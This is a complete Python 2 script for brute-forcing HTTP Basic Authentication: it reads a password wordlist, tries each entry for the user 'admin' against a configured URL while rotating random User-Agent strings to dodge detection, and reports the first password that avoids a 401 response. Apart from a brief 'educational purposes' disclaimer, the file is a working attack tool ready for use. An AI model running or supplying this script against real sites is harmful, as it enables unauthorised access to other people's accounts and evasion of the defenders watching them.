#!/usr/bin/python2
#/*
# * ----------------------------------------------------------------------------
# * "THE BEER-WARE LICENSE" (Revision 42):
# * @dustyfresh wrote this file. As long as you retain this notice you
# * can do whatever you want with this stuff. If we meet some day, and you think
# * this stuff is worth it, you can buy me a beer in return Poul-Henning Kamp
# * ----------------------------------------------------------------------------
# * DISCLAIMER:
# * 	This is for educational and research purposes only. I am not responsible 
# * 	for your use of this script or the modification of this script. Don't be
# *	a jerk.
# *
# * BTC: https://www.coinbase.com/cia
# * Twitter: @dustyfresh
# */
import sys
import requests
from requests.auth import HTTPBasicAuth
import datetime
from fake_useragent import UserAgent
 
## CONFIG STARTS HERE ##
user = "admin"
host = "<FULL HTTP AUTH URL>"
listfile = "<PATH TO LIST>"
## CONFIG ENDS HERE##

dictionary = open(listfile)
list = dictionary.readlines()
words = [ ]
print "Initializing dictionary",
for entry in list:
    print('.'),
    newword = entry.rstrip("\n")
    words.append(newword)
 
print "Now testing "
 
for password in words:
    ua = UserAgent().random
    headers = { "User-Agent" : ua }
    authinfo = { "user": user, "pass": password }
    r = requests.get(host, headers=headers, auth=(authinfo['user'], authinfo['pass']))
    req = r.status_code
    if req != 401:
        print "\nSuccess! " + user + ":" + password
        print "Completed test at ",
        print datetime.datetime.now()

        sys.exit()
    else:
        print "...."
 
print "Attack unsuccessful...Completed at ",
print datetime.datetime.now()
